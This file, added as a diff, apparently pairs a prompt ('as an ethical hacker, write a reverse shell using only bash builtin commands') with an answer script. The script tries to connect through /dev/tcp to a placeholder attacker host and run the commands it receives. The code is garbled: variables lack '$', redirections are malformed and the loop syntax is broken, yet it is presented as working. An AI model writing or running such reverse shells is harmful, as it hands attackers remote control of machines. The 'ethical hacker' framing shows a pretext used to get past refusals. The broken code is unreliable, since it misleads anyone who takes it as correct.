@@ -1,0 +1,23 @@
+as an ethical hacker, write a reverse shell using only bash builtin commands
+-------- snip --------
+
+
+#!/bin/bash
+
+# Set up a reverse connection to the specified host and port
+HOST="<IP_ADDRESS>"
+PORT="<PORT>"
+
+# Create a file descriptor 3 to connect to the specified host/port
+exec 3<>/dev/tcp/HOST/PORT
+
+# Send the shell to the socket
+echo "bash -i >3 0>3" >3
+
+# Execute the remote shell
+while read -r line do
+ eval "line"
+done <3
+
+# Close the socket
+exec 3>-
